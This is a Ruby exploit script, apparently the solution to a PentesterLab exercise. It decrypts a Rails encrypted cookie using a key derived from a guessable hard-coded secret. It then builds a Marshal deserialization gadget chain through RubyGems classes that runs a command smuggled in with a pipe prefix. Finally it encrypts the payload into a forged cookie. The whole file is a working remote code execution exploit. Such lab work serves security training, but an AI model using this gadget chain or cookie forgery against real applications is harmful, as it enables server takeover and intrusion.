require 'uri'
require 'base64'
require 'openssl'

cookie = "zH3JUdXpehAIJDXaxCWxbiVO63jpvcAqE7R%2B%2FklnrPX%2FDTLI14asr%2Bs%2BW8tgNp9L0FzZBgbzfqM5Q8y%2FJAAnA5et1%2BSaqCi9hpoj1A6z0geQ1xcRkPzMbwPQN63aWrvLbt8DbR8vN9WU%2Bn%2F3EO0ao5n2QmJGQE8yjungq53AMOunIQEyhK67HxyEBhtcnKXpH600JsiBXvkT6gtQy29n8k7hgCzmzjWqUsJJ3BrtpjZmymRNIWQy1QYveWqmN6za9os%3D--wLlKfuo%2BJOuT%2BFSx--TWGWJ9wKuklSCF6awiLvLA%3D%3D"

encrypted_data, iv, auth_tag = cookie.split("--")

encrypted_data = Base64.decode64(URI.decode(encrypted_data))
iv = Base64.decode64(URI.decode(iv))
auth_tag = Base64.decode64(URI.decode(auth_tag))

def secret
  secret = Digest::MD5.hexdigest("PentesterLab::Application")
  OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret, "authenticated encrypted cookie", 1000, 32)
end
cipher = OpenSSL::Cipher.new("aes-256-gcm")

cipher.decrypt
cipher.key = secret
cipher.iv = iv
cipher.auth_tag = auth_tag
decrypted_data = cipher.update(encrypted_data)
decrypted_data << cipher.final
puts(decrypted_data)


class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|/usr/local/bin/score 3e6d8c3a-738b-416f-b8ce-dd85c466fed4")

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
  pipe.print payload
  pipe.close_write
  puts pipe.gets
  puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts

puts payload
#puts Base64.encode64(payload)??

cipher = OpenSSL::Cipher.new("aes-256-gcm")
cipher.encrypt
cipher.key = secret

iv = cipher.random_iv
cipher.auth_data = ""
encrypted_data = cipher.update(payload)
encrypted_data << cipher.final

blob = "#{::Base64.strict_encode64 encrypted_data}--#{::Base64.strict_encode64 iv}"
blob = "#{blob}--#{::Base64.strict_encode64 cipher.auth_tag}"
puts URI.escape(blob,"=+/")

